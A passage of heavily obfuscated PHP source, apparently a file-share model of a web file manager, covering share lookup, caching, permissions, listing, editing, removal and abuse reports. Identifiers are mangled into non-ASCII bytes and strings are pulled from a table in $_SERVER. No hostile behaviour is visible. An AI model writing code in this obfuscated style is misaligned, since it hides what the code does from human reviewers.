(isset($¿Š˜‹¸[$ï­˜®ò[88]]) && $²ï´ùıÆ != $¿Š˜‹¸[$ï­˜®ò[88]]) { $”™ãÓŞ‡ = $this->cacheKeyMake($ï­˜®ò[2092], $Íò®‡˜À, $Ù÷ôß÷À); $¿Š˜‹¸ = $this->_getShareInfo(array($ï­˜®ò[672] => $Íò®‡˜À)); Cache::set($”™ãÓŞ‡, $¿Š˜‹¸); } return $¿Š˜‹¸; } private function shareInfoMofify(&$ÁÄä¬”, $çİèç¡› = "\147\x65\164") { $Š¢áÖìŠ =& $_SERVER[¯‘·½]; if (!$ÁÄä¬” || !isset($ÁÄä¬”[$Š¢áÖìŠ[672]])) { return; } $³ıœ‚–Ó = $Š¢áÖìŠ[2153] . $ÁÄä¬”[$Š¢áÖìŠ[672]]; if ($çİèç¡› == $Š¢áÖìŠ[226]) { return Cache::get($³ıœ‚–Ó); } else { if ($çİèç¡› == $Š¢áÖìŠ[2121]) { $µø€¹å = Cache::get($³ıœ‚–Ó); if ($µø€¹å === $ÁÄä¬”[$Š¢áÖìŠ[88]]) { return; } $ÁÄä¬”[$Š¢áÖìŠ[2154]] = USER_ID . $Š¢áÖìŠ[464] . $ÁÄä¬”[$Š¢áÖìŠ[88]]; Cache::set($³ıœ‚–Ó, $ÁÄä¬”[$Š¢áÖìŠ[88]]); } else { if ($çİèç¡› == $Š¢áÖìŠ[2155]) { Cache::remove($³ıœ‚–Ó); } } } } public function getInfoByHash($ëã‚¸¡ˆ) { return $this->_getShareInfo(array($_SERVER[¯‘·½][2156] => $ëã‚¸¡ˆ)); } public function getInfoByPath($­éƒèÊ) { $ŞÍ€„Ğ€ =& $_SERVER[¯‘·½]; $Àì¼ß = array($ŞÍ€„Ğ€[1806] => USER_ID, $ŞÍ€„Ğ€[194] => $­éƒèÊ); return $this->_getShareInfo($Àì¼ß); } public function getInfoBySourcePath($™›Õ’•) { $¶Ç‚ê¢¾ =& $_SERVER[¯‘·½]; $ÁÏ°Í¡ = array($¶Ç‚ê¢¾[1806] => USER_ID, $¶Ç‚ê¢¾[1281] => $™›Õ’•); return $this->_getShareInfo($ÁÏ°Í¡); } private function _getShareInfo($îŞô§²ñ) { $ÎıÍŞÄ =& $_SERVER[¯‘·½]; $¿Î²Í• = $this->where($îŞô§²ñ)->find(); if (!$¿Î²Í•) { return !1; } $îŞô§²ñ = array($ÎıÍŞÄ[672] => $¿Î²Í•[$ÎıÍŞÄ[672]]); $ôŒÕµ…ç = $ÎıÍŞÄ[2157]; $˜´ş²› = Model($ÎıÍŞÄ[673])->order($ÎıÍŞÄ[477])->field($ôŒÕµ…ç)->where($îŞô§²ñ)->select(); if ($¿Î²Í•[$ÎıÍŞÄ[194]] == $ÎıÍŞÄ[231]) { $¿Î²Í•[$ÎıÍŞÄ[90]] = IO::info($¿Î²Í•[$ÎıÍŞÄ[1281]]); } else { $¿Î²Í•[$ÎıÍŞÄ[90]] = Model($ÎıÍŞÄ[1452])->pathInfo($¿Î²Í•[$ÎıÍŞÄ[194]]); } $¿Î²Í•[$ÎıÍŞÄ[2158]] = $˜´ş²›; $this->shareInfoMofify($¿Î²Í•, $ÎıÍŞÄ[2121]); return $¿Î²Í•; } protected function getInfoAuth($”õ½•¿¢) { $½ìì”™ù =& $_SERVER[¯‘·½]; $ò¿—×•ô = $this->getInfo($”õ½•¿¢); if ($ò¿—×•ô[$½ìì”™ù[1806]] == USER_ID) { $ò¿—×•ô[$½ìì”™ù[489]] = $ò¿—×•ô[$½ìì”™ù[90]][$½ìì”™ù[489]]; } else { $ò¿—×•ô[$½ìì”™ù[489]] = Model($½ìì”™ù[571])->authMake($ò¿—×•ô[$½ìì”™ù[2158]]); } return $ò¿—×•ô; } protected function listData($ñ½ùø–ã = null, $ì¾Éµ²Ú = 300) { $éòûîÌ¹ =& $_SERVER[¯‘·½]; $Û¯‚Úƒ¦ = array(array($éòûîÌ¹[566] => array($éòûîÌ¹[1108], 0), $éòûîÌ¹[670] => array($éòûîÌ¹[1108], 0), $éòûîÌ¹[2159] => $éòûîÌ¹[2109])); if ($ñ½ùø–ã == $éòûîÌ¹[2160]) { $Û¯‚Úƒ¦ = array($éòûîÌ¹[566] => 1); } else { if ($ñ½ùø–ã == $éòûîÌ¹[1264]) { $Û¯‚Úƒ¦ = array($éòûîÌ¹[670] => 1); } } $Û¯‚Úƒ¦[$éòûîÌ¹[1806]] = USER_ID; $Æ²†˜è = $this->where($Û¯‚Úƒ¦)->selectPage($ì¾Éµ²Ú); return $Æ²†˜è; } protected function listToMe($ã¼§©ñ‘ = 300) { $ãÏÒ—™ø =& $_SERVER[¯‘·½]; $œÈ‹ÒØº = Model($ãÏÒ—™ø[2161])->userGroupParents(USER_ID); $Ã¥š¼³ = array($ãÏÒ—™ø[655] => SourceModel::TYPE_USER, $ãÏÒ—™ø[573] => USER_ID); if ($œÈ‹ÒØº) { $Ã¥š¼³ = array(array($ãÏÒ—™ø[655] => SourceModel::TYPE_USER, $ãÏÒ—™ø[573] => USER_ID), array($ãÏÒ—™ø[655] => SourceModel::TYPE_GROUP, $ãÏÒ—™ø[573] => array($ãÏÒ—™ø[7], $œÈ‹ÒØº)), $ãÏÒ—™ø[2159] => $ãÏÒ—™ø[2109]); } $ğæ’’Õ‹ = Model($ãÏÒ—™ø[673])->where($Ã¥š¼³)->selectPage($ã¼§©ñ‘); $“Â¬½® = array_to_keyvalue_group($ğæ’’Õ‹[$ãÏÒ—™ø[447]], $ãÏÒ—™ø[672]); if (!$“Â¬½®) { return $ğæ’’Õ‹; } $İÔÎê¡û = $ãÏÒ—™ø[2162]; $Ã¥š¼³ = array($ãÏÒ—™ø[672] => array($ãÏÒ—™ø[494], array_keys($“Â¬½®)), $ãÏÒ—™ø[1806] => array($ãÏÒ—™ø[1110], $ãÏÒ—™ø[231])); $áí£²Ü = $this->field($İÔÎê¡û)->where($Ã¥š¼³)->select(); foreach ($áí£²Ü as $›”­©•¯ => &$²•ŠÙÚ¹) { $²•ŠÙÚ¹[$ãÏÒ—™ø[2158]] = $“Â¬½®[$²•ŠÙÚ¹[$ãÏÒ—™ø[672]]]; } unset($²•ŠÙÚ¹); $º¥ò÷æ‡ = array($ãÏÒ—™ø[2163] => $áí£²Ü, $ãÏÒ—™ø[2164] => $ğæ’’Õ‹[$ãÏÒ—™ø[444]]); return $º¥ò÷æ‡; } protected function shareAdd($ƒÙ´±¶Ñ, $¢Ìí§) { $Ê‘„ÉÂ« =& $_SERVER[¯‘·½]; $ó§ä…ôÁ = $this->_addShareData($ƒÙ´±¶Ñ, $¢Ìí§); if (!empty($¢Ìí§[$Ê‘„ÉÂ«[2165]])) { $this->_shareAuthSet($ó§ä…ôÁ, $¢Ìí§[$Ê‘„ÉÂ«[2165]]); } $this->shareEventAdd($ƒÙ´±¶Ñ, $¢Ìí§, $Ê‘„ÉÂ«[2166]); return $ó§ä…ôÁ; } protected function shareAddSystem($ˆ¶èñì, $ƒÒ¡è®ã) { $ä±“Ÿ› =& $_SERVER[¯‘·½]; $ıê­à—ë = $this->_addShareData($ˆ¶èñì, $ƒÒ¡è®ã, $ä±“Ÿ›[192]); $this->_shareAuthSet($ıê­à—ë, $ƒÒ¡è®ã[$ä±“Ÿ›[2165]]); return $ıê­à—ë; } private function shareEventAdd($Ö»Ø×¾, $ø¾¯î§ò, $²§ó®°© = "\141\x64\144") { $åú‰Ñû =& $_SERVER[¯‘·½]; if (!$Ö»Ø×¾ || $Ö»Ø×¾ == $åú‰Ñû[231]) { return; } if ($²§ó®°© == $åú‰Ñû[2166]) { if ($ø¾¯î§ò[$åú‰Ñû[566]] == $åú‰Ñû[91]) { Model($åú‰Ñû[640])->eventShare($Ö»Ø×¾, $åú‰Ñû[2167]); } if ($ø¾¯î§ò[$åú‰Ñû[670]] == $åú‰Ñû[91]) { Model($åú‰Ñû[640])->eventShare($Ö»Ø×¾, $åú‰Ñû[2168]); } return; } $é‚²×ß = $this->getInfoByPath($Ö»Ø×¾); $±Êæ“­ş = $åú‰Ñû[2169]; if ($é‚²×ß[$åú‰Ñû[566]] == $åú‰Ñû[231] && $ø¾¯î§ò[$åú‰Ñû[566]] == $åú‰Ñû[91]) { $±Êæ“­ş = $åú‰Ñû[2167]; } if ($é‚²×ß[$åú‰Ñû[566]] == $åú‰Ñû[91] && $ø¾¯î§ò[$åú‰Ñû[566]] == $åú‰Ñû[231]) { $±Êæ“­ş = $åú‰Ñû[2170]; } if ($é‚²×ß[$åú‰Ñû[670]] == $åú‰Ñû[231] && $ø¾¯î§ò[$åú‰Ñû[670]] == $åú‰Ñû[91]) { $±Êæ“­ş = $åú‰Ñû[2168]; } if ($é‚²×ß[$åú‰Ñû[670]] == $åú‰Ñû[91] && $ø¾¯î§ò[$åú‰Ñû[670]] == $åú‰Ñû[231]) { $±Êæ“­ş = $åú‰Ñû[2171]; } Model($åú‰Ñû[640])->eventShare($Ö»Ø×¾, $±Êæ“­ş); return; } private function _addShareData($ÜûÌÄÃ€, $”–çÜ¬ = array(), $ÓÛ´—£ = false) { $¥¸ŠöØ =& $_SERVER[¯‘·½]; $ÉÊœ²¨í = $ÓÛ´—£ == $¥¸ŠöØ[192] ? 0 : USER_ID; $¹ûÎæ€½ = array($¥¸ŠöØ[493] => $ÜûÌÄÃ€, $¥¸ŠöØ[1797] => $ÉÊœ²¨í); if ($ÜûÌÄÃ€ == 0) { $¹ûÎæ€½ = array($¥¸ŠöØ[2172] => $”–çÜ¬[$¥¸ŠöØ[1281]], $¥¸ŠöØ[1797] => $ÉÊœ²¨í); } if ($éÆŞìÔ× = $this->where($¹ûÎæ€½)->find()) { return $éÆŞìÔ×[$¥¸ŠöØ[672]]; } if ($ÜûÌÄÃ€ == 0) { $±Ôé‘Ò = array($¥¸ŠöØ[32] => get_path_this($”–çÜ¬[$¥¸ŠöØ[87]])); } else { $±Ôé‘Ò = Model($¥¸ŠöØ[916])->sourceInfo($ÜûÌÄÃ€); if (!$±Ôé‘Ò) { return !1; } } if (!$”–çÜ¬[$¥¸ŠöØ[1693]]) { $”–çÜ¬[$¥¸ŠöØ[1693]] = $±Ôé‘Ò[$¥¸ŠöØ[32]]; } $§‹§§ó™ = array($¥¸ŠöØ[1797] => $ÉÊœ²¨í, $¥¸ŠöØ[493] => $ÜûÌÄÃ€, $¥¸ŠöØ[1693] => $¥¸ŠöØ[12], $¥¸ŠöØ[566] => 0, $¥¸ŠöØ[670] => 0, $¥¸ŠöØ[1281] => $¥¸ŠöØ[12], $¥¸ŠöØ[384] => $¥¸ŠöØ[12], $¥¸ŠöØ[985] => $¥¸ŠöØ[12], $¥¸ŠöØ[2173] => 0, $¥¸ŠöØ[2174] => 0, $¥¸ŠöØ[847] => 0, $¥¸ŠöØ[2175] => $¥¸ŠöØ[12], $¥¸ŠöØ[2156] => $¥¸ŠöØ[12]); $Èö ƒˆŸ = explode($¥¸ŠöØ[50], $¥¸ŠöØ[2176]); foreach ($Èö ƒˆŸ as $‘÷ÕŒÉ) { if (!isset($”–çÜ¬[$‘÷ÕŒÉ])) { continue; } $§‹§§ó™[$‘÷ÕŒÉ] = $”–çÜ¬[$‘÷ÕŒÉ]; } $Äª£Ö½Ã = $this->add($§‹§§ó™); $Ùö€Ê¢™ = array($¥¸ŠöØ[2156] => short_id($Äª£Ö½Ã)); if ($this->where($Ùö€Ê¢™)->find()) { $Ùö€Ê¢™[$¥¸ŠöØ[2156]] .= $¥¸ŠöØ[464] . rand_string(2, 3); } $this->where(array($¥¸ŠöØ[2177] => $Äª£Ö½Ã))->save($Ùö€Ê¢™); return $Äª£Ö½Ã; } private function _shareAuthSet($³üÛÀç, $ßËÊ§†) { $™æ¹çİ =& $_SERVER[¯‘·½]; if (!is_array($ßËÊ§†)) { return !1; } $ öÎ–‡Ç = Model($™æ¹çİ[2119]); $ öÎ–‡Ç->where(array($™æ¹çİ[672] => $³üÛÀç))->delete(); $†²íÉ¡ï = array(); foreach ($ßËÊ§† as $ÂÏ „) { $ö›ñ§É¸ = SourceModel::TYPE_USER; if ($ÂÏ „[$™æ¹çİ[191]] == SourceModel::TYPE_GROUP) { $ö›ñ§É¸ = SourceModel::TYPE_GROUP; } $®ßÅÛ• = array($™æ¹çİ[672] => $³üÛÀç, $™æ¹çİ[191] => $ö›ñ§É¸, $™æ¹çİ[573] => intval($ÂÏ „[$™æ¹çİ[573]]), $™æ¹çİ[2115] => 0, $™æ¹çİ[2178] => -1); if ($ÂÏ „[$™æ¹çİ[2115]]) { $®ßÅÛ•[$™æ¹çİ[2115]] = $ÂÏ „[$™æ¹çİ[2115]]; } else { if ($ÂÏ „[$™æ¹çİ[2178]]) { $®ßÅÛ•[$™æ¹çİ[2178]] = $ÂÏ „[$™æ¹çİ[2178]]; } } $†²íÉ¡ï[] = $®ßÅÛ•; } return $ öÎ–‡Ç->addAll($†²íÉ¡ï, array(), !0); } public function numViewAdd($ØÉ²€½µ) { $¦í°Ìß =& $_SERVER[¯‘·½]; $÷å–ŞÆ® = array($¦í°Ìß[2177] => $ØÉ²€½µ); $this->where($÷å–ŞÆ®)->setAdd($¦í°Ìß[2173]); } public function numDownloadAdd($—¸Ó¬ó¿) { $éú‹«ëİ =& $_SERVER[¯‘·½]; $™í¤„¯ = array($éú‹«ëİ[2177] => $—¸Ó¬ó¿); $this->where($™í¤„¯)->setAdd($éú‹«ëİ[2174]); } protected function shareEdit($ÙÄ­‹à¿, $Ö¨Ó‡ôà) { $Ì¹°¯œÄ =& $_SERVER[¯‘·½]; $Ñìç¸ú÷ = $this->getInfo($ÙÄ­‹à¿); if (!$Ñìç¸ú÷) { return !1; } if ($Ö¨Ó‡ôà[$Ì¹°¯œÄ[2156]] && $Ö¨Ó‡ôà[$Ì¹°¯œÄ[566]] == $Ì¹°¯œÄ[91]) { if ($Ö¨Ó‡ôà[$Ì¹°¯œÄ[2156]] == $Ñìç¸ú÷[$Ì¹°¯œÄ[2156]]) { unset($Ö¨Ó‡ôà[$Ì¹°¯œÄ[2156]]); } if ($Ö¨Ó‡ôà[$Ì¹°¯œÄ[2156]]) { $É–ÜÏŞ¾ = $this->where(array($Ì¹°¯œÄ[2179] => $Ö¨Ó‡ôà[$Ì¹°¯œÄ[2156]]))->find(); if ($É–ÜÏŞ¾) { return !1; } if (!is_array($Ö¨Ó‡ôà[$Ì¹°¯œÄ[2175]])) { $Ö¨Ó‡ôà[$Ì¹°¯œÄ[2175]] = array(); } if (!$Ö¨Ó‡ôà[$Ì¹°¯œÄ[2175]][$Ì¹°¯œÄ[2180]]) { $Ö¨Ó‡ôà[$Ì¹°¯œÄ[2175]][$Ì¹°¯œÄ[2180]] = $Ñìç¸ú÷[$Ì¹°¯œÄ[2156]]; $Ö¨Ó‡ôà[$Ì¹°¯œÄ[2175]][$Ì¹°¯œÄ[2181]] = $Ì¹°¯œÄ[91]; } } } $this->_checkLinkShare($Ö¨Ó‡ôà, $Ñìç¸ú÷); $Ş½åÕ = array(); $»Âİ¶üâ = explode($Ì¹°¯œÄ[50], $Ì¹°¯œÄ[2182]); foreach ($»Âİ¶üâ as $í¶ıøÛ¸) { if (!array_key_exists($í¶ıøÛ¸, $Ö¨Ó‡ôà)) { continue; } $Ş½åÕ[$í¶ıøÛ¸] = $Ö¨Ó‡ôà[$í¶ıøÛ¸]; } $this->shareEventAdd($Ñìç¸ú÷[$Ì¹°¯œÄ[194]], $Ö¨Ó‡ôà, $Ì¹°¯œÄ[1976]); $this->where(array($Ì¹°¯œÄ[2177] => $ÙÄ­‹à¿))->save($Ş½åÕ); if (isset($Ö¨Ó‡ôà[$Ì¹°¯œÄ[2165]])) { $this->_shareAuthSet($ÙÄ­‹à¿, $Ö¨Ó‡ôà[$Ì¹°¯œÄ[2165]]); } return !0; } private function _checkLinkShare($ı¶ÓĞù, $ã—­“²) { $ïºŠõÕ =& $_SERVER[¯‘·½]; if ($ı¶ÓĞù[$ïºŠõÕ[566]] != $ïºŠõÕ[91]) { return; } $Œ¬õ»ïæ = $ã—­“²[$ïºŠõÕ[90]][$ïºŠõÕ[194]]; if ($ã—­“²[$ïºŠõÕ[90]][$ïºŠõÕ[33]] != $ïºŠõÕ[233]) { $ûéŠÒÁĞ = $this->_folderReport($Œ¬õ»ïæ); if (!$ûéŠÒÁĞ) { return; } show_json(LNG($ïºŠõÕ[2183]) . $ïºŠõÕ[2184] . $ûéŠÒÁĞ, !1); } $õ¼õ¯êá = Model($ïºŠõÕ[916])->fileInfoGet($ã—­“²[$ïºŠõÕ[90]][$ïºŠõÕ[194]]); if (!$õ¼õ¯êá) { return; } $ÌÀ…¸İ‹ = $this->shareFileMeta($õ¼õ¯êá[$ïºŠõÕ[545]]); if (isset($ÌÀ…¸İ‹[$ïºŠõÕ[452]]) && $ÌÀ…¸İ‹[$ïºŠõÕ[452]] == $ïºŠõÕ[91]) { show_json(LNG($ïºŠõÕ[2185]), !1); } } private function _folderReport($¶…Öáä…) { $ûõ±çá =& $_SERVER[¯‘·½]; $€åÖÒ¿ = array($ûõ±çá[545] => array($ûõ±çá[1108], 0), $ûõ±çá[835] => 3); $Ú÷œ¦Œ” = Model($ûõ±çá[2186])->where($€åÖÒ¿)->field($ûõ±çá[545])->select(); if (!$Ú÷œ¦Œ”) { return !1; } $Ú÷œ¦Œ” = array_to_keyvalue($Ú÷œ¦Œ”, $ûõ±çá[12], $ûõ±çá[545]); $ÉÜã–Îó = $ûõ±çá[50] . $¶…Öáä… . $ûõ±çá[50]; $€åÖÒ¿ = array($ûõ±çá[545] => array($ûõ±çá[7], $Ú÷œ¦Œ”), $ûõ±çá[588] => array($ûõ±çá[461], "\45{$ÉÜã–Îó}\45"), $ûõ±çá[507] => 0); $Ù³ÚˆÅ = Model($ûõ±çá[916])->where($€åÖÒ¿)->field($ûõ±çá[2187])->find(); if (!$Ù³ÚˆÅ) { return !1; } $¤œßó’õ = substr($Ù³ÚˆÅ[$ûõ±çá[588]], strpos($Ù³ÚˆÅ[$ûõ±çá[588]], $ÉÜã–Îó)); $€åÖÒ¿ = array($ûõ±çá[194] => array($ûõ±çá[7], trim($¤œßó’õ, $ûõ±çá[50]))); $•’ìÜœº = Model($ûõ±çá[916])->where($€åÖÒ¿)->field($ûõ±çá[32])->select(); $Ì€¢Î¡ = array_to_keyvalue($•’ìÜœº, $ûõ±çá[12], $ûõ±çá[32]); $Ì€¢Î¡[] = $Ù³ÚˆÅ[$ûõ±çá[32]]; return implode($ûõ±çá[8], $Ì€¢Î¡); } protected function remove($ÙË¿Ä¦­) { $„ìÊøÆä =& $_SERVER[¯‘·½]; $ŸÀ„¥ Ø = is_array($ÙË¿Ä¦­) ? $ÙË¿Ä¦­ : array($ÙË¿Ä¦­); for ($óÇ³ˆÚÙ = 0; $óÇ³ˆÚÙ < count($ŸÀ„¥ Ø); $óÇ³ˆÚÙ++) { $¬ˆ¾ß§æ = $this->getInfo($ŸÀ„¥ Ø[$óÇ³ˆÚÙ]); if ($¬ˆ¾ß§æ[$„ìÊøÆä[670]] == $„ìÊøÆä[91]) { Model($„ìÊøÆä[640])->eventShare($¬ˆ¾ß§æ[$„ìÊøÆä[194]], $„ìÊøÆä[2171]); } if ($¬ˆ¾ß§æ[$„ìÊøÆä[566]] == $„ìÊøÆä[91]) { Model($„ìÊøÆä[640])->eventShare($¬ˆ¾ß§æ[$„ìÊøÆä[194]], $„ìÊøÆä[2170]); } $this->shareInfoMofify($¬ˆ¾ß§æ, $„ìÊøÆä[2155]); } $Òé’Í¡‰ = array($„ìÊøÆä[672] => array($„ìÊøÆä[7], $ŸÀ„¥ Ø)); $ÓöôãØş = $this->where($Òé’Í¡‰)->delete(); if ($ÓöôãØş) { Model($„ìÊøÆä[673])->where($Òé’Í¡‰)->delete(); } return $ÓöôãØş; } protected function removeBySource($—»…•‰ñ) { $‡Ä‰¿ =& $_SERVER[¯‘·½]; $ğ—Ñ©´ = array($‡Ä‰¿[493] => array($‡Ä‰¿[494], $—»…•‰ñ)); $Î±ŸÓ£¿ = $this->field($‡Ä‰¿[672])->where($ğ—Ñ©´)->select(); $ãş­Í¢Ş = array_to_keyvalue($Î±ŸÓ£¿, $‡Ä‰¿[12], $‡Ä‰¿[672]); if (!$ãş­Í¢Ş) { return; } foreach ($Î±ŸÓ£¿ as $›»ÜÙÍ¿) { $this->shareInfoMofify($›»ÜÙÍ¿, $‡Ä‰¿[2155]); } $ğ—Ñ©´ = array($‡Ä‰¿[2177] => array($‡Ä‰¿[494], $ãş­Í¢Ş)); $this->where($ğ—Ñ©´)->delete(); Model($‡Ä‰¿[673])->where($ğ—Ñ©´)->delete(); } public function listAll($¼éäÃª) { $™ ­öæÔ =& $_SERVER[¯‘·½]; $ŞÁáËÅ = array(); if ($¼éäÃª[$™ ­öæÔ[1806]]) { $ŞÁáËÅ[$™ ­öæÔ[1806]] = $¼éäÃª[$™ ­öæÔ[1806]]; } if ($¼éäÃª[$™ ­öæÔ[846]]) { $Ö­Ú¡ü¦ = $¼éäÃª[$™ ­öæÔ[847]] ? $¼éäÃª[$™ ­öæÔ[847]] : strtotime(date($™ ­öæÔ[2188])); $ŞÁáËÅ[$™ ­öæÔ[234]] = array($™ ­öæÔ[410], array($¼éäÃª[$™ ­öæÔ[846]], $Ö­Ú¡ü¦)); } if ($¼éäÃª[$™ ­öæÔ[33]]) { $ŞÁáËÅ[$¼éäÃª[$™ ­öæÔ[33]]] = 1; } else { $ŞÁáËÅ[] = array($™ ­öæÔ[566] => array($™ ­öæÔ[1108], 0), $™ ­öæÔ[670] => array($™ ­öæÔ[1108], 0), $™ ­öæÔ[2159] => $™ ­öæÔ[2109]); } if ($¼éäÃª[$™ ­öæÔ[2105]]) { $ŞÁáËÅ[] = array($™ ­öæÔ[2156] => $¼éäÃª[$™ ­öæÔ[2105]], $™ ­öæÔ[1693] => array($™ ­öæÔ[461], "\45{$¼éäÃª[$™ ­öæÔ[2105]]}\45"), $™ ­öæÔ[2159] => $™ ­öæÔ[2109]); } $”Á¯øİ = $this->_makeOrder()->where($ŞÁáËÅ)->selectPage(20); if (empty($”Á¯øİ[$™ ­öæÔ[447]])) { return array(); } $this->_listDataApply($”Á¯øİ[$™ ­öæÔ[447]]); return $”Á¯øİ; } public function listDataApply($ØÊöÈˆ¼) { $this->_listDataApply($ØÊöÈˆ¼); return $ØÊöÈˆ¼; } private function _listDataApply(&$ø£ŸËÓë) { $Ø°îÑ­± =& $_SERVER[¯‘·½]; $·ìÔ‰ = array_to_keyvalue($ø£ŸËÓë, $Ø°îÑ­±[12], $Ø°îÑ­±[1806]); $­°Ê’ï = Model($Ø°îÑ­±[601])->userListInfo(array_unique($·ìÔ‰)); $¹ù˜‘ÂÆ = array_to_keyvalue($ø£ŸËÓë, $Ø°îÑ­±[12], $Ø°îÑ­±[194]); $±ÇÛ‹·ª = Model($Ø°îÑ­±[916])->sourceListInfo($¹ù˜‘ÂÆ, !0); foreach ($ø£ŸËÓë as $‡Ì™ş•Ë => &$†¤©Ñœ) { $¿³ØŸš‚ = $†¤©Ñœ[$Ø°îÑ­±[1806]]; $†¤©Ñœ[$Ø°îÑ­±[2189]] = $­°Ê’ï[$¿³ØŸš‚] ? $­°Ê’ï[$¿³ØŸš‚] : !1; if (!$†¤©Ñœ[$Ø°îÑ­±[2189]] || $†¤©Ñœ[$Ø°îÑ­±[2189]][$Ø°îÑ­±[835]] != $Ø°îÑ­±[91]) { unset($ø£ŸËÓë[$‡Ì™ş•Ë]); continue; } $°Û¡•ğ = $†¤©Ñœ[$Ø°îÑ­±[194]]; $†¤©Ñœ[$Ø°îÑ­±[90]] = $±ÇÛ‹·ª[$°Û¡•ğ] ? $±ÇÛ‹·ª[$°Û¡•ğ] : !1; if ($†¤©Ñœ[$Ø°îÑ­±[90]][$Ø°îÑ­±[507]] == $Ø°îÑ­±[91]) { unset($ø£ŸËÓë[$‡Ì™ş•Ë]); } if ($†¤©Ñœ[$Ø°îÑ­±[90]] != $Ø°îÑ­±[231] && !$†¤©Ñœ[$Ø°îÑ­±[90]]) { unset($ø£ŸËÓë[$‡Ì™ş•Ë]); } } unset($†¤©Ñœ); $ø£ŸËÓë = array_values($ø£ŸËÓë); } private function _makeOrder($†Íê‡şŒ = '') { $à¾ò¿ÊŠ =& $_SERVER[¯‘·½]; $¾ÆßÛÂ‚ = array($à¾ò¿ÊŠ[234], $à¾ò¿ÊŠ[847], $à¾ò¿ÊŠ[2173], $à¾ò¿ÊŠ[2174]); $éøõøÑâ = array($à¾ò¿ÊŠ[525] => $à¾ò¿ÊŠ[526], $à¾ò¿ÊŠ[527] => $à¾ò¿ÊŠ[528]); $×ÚÂÊŸ = Input::get($à¾ò¿ÊŠ[532], $à¾ò¿ÊŠ[7], $à¾ò¿ÊŠ[499], $¾ÆßÛÂ‚); $¹à¶Š—ì = Input::get($à¾ò¿ÊŠ[533], $à¾ò¿ÊŠ[7], $à¾ò¿ÊŠ[2190], array($à¾ò¿ÊŠ[2102], $à¾ò¿ÊŠ[527])); $¹à¶Š—ì = $éøõøÑâ[$¹à¶Š—ì]; $†Íê‡şŒ = $†Íê‡şŒ . "{$×ÚÂÊŸ}\40{$¹à¶Š—ì}"; return $this->order($†Íê‡şŒ); } public function reportAdd($‹ëá¯ÇÕ) { $öÌ¸¸ =& $_SERVER[¯‘·½]; $ÏŠğÄ™ë = array($öÌ¸¸[672] => $‹ëá¯ÇÕ[$öÌ¸¸[672]], $öÌ¸¸[1806] => USER_ID); if (Model($öÌ¸¸[2186])->where($ÏŠğÄ™ë)->find()) { return !1; } $§Ñ¤·¨¡ = array($öÌ¸¸[672] => $‹ëá¯ÇÕ[$öÌ¸¸[672]], $öÌ¸¸[1693] => $‹ëá¯ÇÕ[$öÌ¸¸[1693]], $öÌ¸¸[194] => $‹ëá¯ÇÕ[$öÌ¸¸[194]], $öÌ¸¸[545] => $‹ëá¯ÇÕ[$öÌ¸¸[545]], $öÌ¸¸[1806] => USER_ID, $öÌ¸¸[33] => $‹ëá¯ÇÕ[$öÌ¸¸[33]], $öÌ¸¸[528] => $‹ëá¯ÇÕ[$öÌ¸¸[528]]); return Model($öÌ¸¸[2186])->add($§Ñ¤·¨¡); } public function reportList($€—Ûª°ê) { $×ìì­§İ =& $_SERVER[¯‘·½]; $Â¢ğ˜¦ = array(); if ($€—Ûª°ê[$×ìì­§İ[846]]) { $ÒòÉìê÷ = $€—Ûª°ê[$×ìì­§İ[847]] ? $€—Ûª°ê[$×ìì­§İ[847]] : strtotime(date($×ìì­§İ[2188])); $Â¢ğ˜¦[$×ìì­§İ[234]] = array($×ìì­§İ[410], array($€—Ûª°ê[$×ìì­§İ[846]], $ÒòÉìê÷)); } if (isset($€—Ûª°ê[$×ìì­§İ[33]]) && in_array($€—Ûª°ê[$×ìì­§İ[33]], array($×ìì­§İ[91], $×ìì­§İ[512], $×ìì­§İ[2191], $×ìì­§İ[2192], $×ìì­§İ[2193]))) { $Â¢ğ˜¦[$×ìì­§İ[33]] = $€—Ûª°ê[$×ìì­§İ[33]]; } if (isset($€—Ûª°ê[$×ìì­§İ[835]]) && in_array($€—Ûª°ê[$×ìì­§İ[835]], array($×ìì­§İ[231], $×ìì­§İ[91], $×ìì­§İ[512], $×ìì­§İ[2191]))) { $Â¢ğ˜¦[$×ìì­§İ[835]] = $€—Ûª°ê[$×ìì­§İ[835]]; } $§«äÏ‰‘ = Input::get($×ìì­§İ[533], $×ìì­§İ[7], $×ìì­§İ[2190], array($×ìì­§İ[2102], $×ìì­§İ[527])); $¢ò„¯ÔŠ = array($×ìì­§İ[525] => $×ìì­§İ[526], $×ìì­§İ[527] => $×ìì­§İ[528]); $«Ú¶™Ó– = $×ìì­§İ[2194] . $¢ò„¯ÔŠ[$§«äÏ‰‘]; $£‰‘ù¿ó = Model($×ìì­§İ[2186])->where($Â¢ğ˜¦)->order($«Ú¶™Ó–)->selectPage(20); if (empty($£‰‘ù¿ó[$×ìì­§İ[447]])) { return array(); } $º—Ú¿ğ® = array_to_keyvalue_group($£‰‘ù¿ó[$×ìì­§İ[447]], $×ìì­§İ[835], $×ìì­§İ[672]); if (!empty($º—Ú¿ğ®[0])) { $€—Ûª°ê = $º—Ú¿ğ®[0]; $Â¢ğ˜¦ = array($×ìì­§İ[672] => array($×ìì­§İ[7], $€—Ûª°ê)); $èàâ±şĞ = $this->where($Â¢ğ˜¦)->field($×ìì­§İ[672])->select(); $èàâ±şĞ = array_to_keyvalue($èàâ±şĞ, $×ìì­§İ[12], $×ìì­§İ[672]); $œ‹‘ìáì = array_diff($€—Ûª°ê, $èàâ±şĞ); if (!empty($œ‹‘ìáì)) { foreach ($£‰‘ù¿ó[$×ìì­§İ[447]] as $¤åÛ¾Ã– => $â˜°òİ) { if (in_array($â˜°òİ[$×ìì­§İ[672]], $œ‹‘ìáì)) { unset($£‰‘ù¿ó[$×ìì­§İ[447]][$¤åÛ¾Ã–]); } } } } $this->_listDataApply($£‰‘ù¿ó[$×ìì­§İ[447]]); return $£‰‘ù¿ó; } public function reportStatus($Õ–Ü²ßÄ) { $Ô÷»çë =& $_SERVER[¯‘·½]; $ÉşŞÂ± = array($Ô÷»çë[477] => $Õ–Ü²ßÄ[$Ô÷»çë[477]]); $ÎÅ”¡Ö„ = Model($Ô÷»çë[2186])->where($ÉşŞÂ±)->field($Ô÷»çë[2195])->find(); if (!$ÎÅ”¡Ö„) { return !1; } $Åß…™£ = array($Ô÷»çë[835] => $Õ–Ü²ßÄ[$Ô÷»çë[835]]); if ($Õ–Ü²ßÄ[$Ô÷»çë[835]] == $Ô÷»çë[2191] && $ÎÅ”¡Ö„[$Ô÷»çë[835]] == $Ô÷»çë[2191]) { $Åß…™£[$Ô÷»çë[835]] = 0; } $Ùú’®ã° = 